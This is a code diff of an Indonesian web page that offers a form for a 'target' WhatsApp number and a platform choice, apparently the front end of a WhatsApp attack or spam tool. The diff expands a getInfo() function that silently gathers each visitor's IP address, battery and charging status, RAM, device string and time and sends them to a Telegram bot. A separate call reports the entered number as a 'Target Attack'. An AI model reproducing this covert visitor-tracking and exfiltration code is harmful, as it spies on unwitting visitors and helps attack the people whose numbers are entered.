@@ -71,7 +71,6 @@
     }
     .login-input:focus { border: 1px solid #2563eb; }
 
-    /* CSS BARU UNTUK PLATFORM SELECTION */
     .platform-label {
       color: #00ff7f;
       font-size: 12px;
@@ -130,7 +129,6 @@
     
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
 
-    <!-- TAMBAHAN FITUR PLATFORM SESUAI FOTO -->
     <p class="platform-label">Platform Selection</p>
     <div class="platform-group">
       <button type="button" class="platform-btn active" onclick="selectPlatform(this)">Android OS</button>
@@ -147,7 +145,6 @@
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
 
-    // Fungsi klik tombol platform (Hanya Tampilan)
     function selectPlatform(btn) {
       document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
       btn.classList.add('active');
@@ -182,15 +179,25 @@
       });
     }
 
+    // FITUR DETEKSI CHARGER (AUTO UPDATE)
     async function getInfo() {
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        const battery = await navigator.getBattery?.() || { level: 0 };
+        
+        // Deteksi baterai dan status charging
+        let batteryInfo = "Tidak didukung";
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          const level = (battery.level * 100).toFixed(0);
+          const chargingStatus = battery.charging ? "Charging" : "Discharging";
+          batteryInfo = `${level}% (${chargingStatus})`;
+        }
+
         const ram = navigator.deviceMemory || "Tidak diketahui";
         const device = navigator.userAgent.split('(')[1].split(')')[0];
 
-        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${(battery.level * 100).toFixed(0)}%\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
         sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
       } catch (err) {}
     }
@@ -244,8 +251,6 @@
       
       button.disabled = true;
       notif.style.display = 'none';
-      
-      // Tetap hanya mengirim nomor target
       sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
       
       setTimeout(() => {
